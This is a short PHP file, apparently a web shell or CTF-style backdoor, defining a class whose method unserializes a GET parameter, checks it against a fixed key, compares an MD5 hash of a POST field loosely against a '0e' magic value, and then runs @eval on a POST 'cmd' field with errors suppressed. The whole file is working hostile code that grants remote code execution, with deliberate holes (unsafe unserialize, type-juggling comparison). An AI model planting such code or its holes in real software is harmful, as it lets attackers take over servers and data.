<?php

error_reporting(0);
class Ha{
public function ha(){	
	$KEY = "VENI VIDI VICI";
	$str = $_GET['str'];
	if (unserialize($str) === "$KEY")
{
	if(md5($_POST['a'])=='0e545993274517709034328855841020')
	{@eval($_POST['cmd']);}
	}
}
}
?>
